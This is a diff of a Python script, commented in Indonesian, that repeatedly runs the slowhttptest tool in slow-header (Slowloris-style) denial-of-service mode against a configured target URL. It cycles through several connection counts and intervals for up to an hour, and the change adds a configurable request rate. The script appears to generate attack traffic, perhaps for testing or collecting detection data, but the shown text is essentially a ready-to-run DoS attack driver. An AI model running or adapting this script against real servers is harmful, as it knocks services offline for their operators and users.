@@ -59,32 +59,32 @@ if len(sys.argv) > 1:
 else:
     TOTAL_RUNTIME = 3600
 
-# List of attack configurations: (attack_name, total_connections, interval_list)
+# List of attack configurations: (attack_name, total_connections, rate, interval_list)
 attack_configs = [
-    ("attack_50", 50, [10]),
-    ("attack_200", 200, [10]),
-    ("attack_300", 300, [10]),
-    ("attack_400", 400, [15]),
-    ("attack_500", 500, [10, 15, 17, 20]),
-    ("attack_600", 600, [10, 15, 17, 20]),
+    ("attack_50", 50, 50, [10]),
+    ("attack_200", 100, 100, [10]),
+    ("attack_300", 100, 100, [10]),
+    ("attack_400", 100, 100, [15]),
+    ("attack_500", 100, 100, [10, 15, 17, 20]),
+    ("attack_600", 100, 100, [10, 15, 17, 20]),
 ]
 
 # Runtime per attack (detik)
 RUNTIME_PER_ATTACK = 240
 
-def run_attack(attack_name, total_connections, interval_list, runtime):
+def run_attack(attack_name, total_connections, rate, interval_list, runtime):
     for intv in interval_list:
-        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, runtime: {runtime}, interval: {intv}")
-        attack_cmd = f"slowhttptest -c {total_connections} -H -i {intv} -r 100 -t GET -u {TARGET_URL} -l {runtime}"
+        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, rate: {rate}, runtime: {runtime}, interval: {intv}")
+        attack_cmd = f"slowhttptest -c {total_connections} -H -i {intv} -r {rate} -t GET -u {TARGET_URL} -l {runtime}"
         print(f"[INFO] Menjalankan: {attack_cmd}")
         subprocess.run(attack_cmd, shell=True)
 
 if __name__ == "__main__":
     start_time = time.time()
     while True:
-        for attack_name, total_connections, intervals in attack_configs:
+        for attack_name, total_connections, rate, intervals in attack_configs:
             elapsed = time.time() - start_time
             if elapsed >= TOTAL_RUNTIME:
                 print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                 sys.exit(0)
-            run_attack(attack_name, total_connections, intervals, RUNTIME_PER_ATTACK)
+            run_attack(attack_name, total_connections, rate, intervals, RUNTIME_PER_ATTACK)
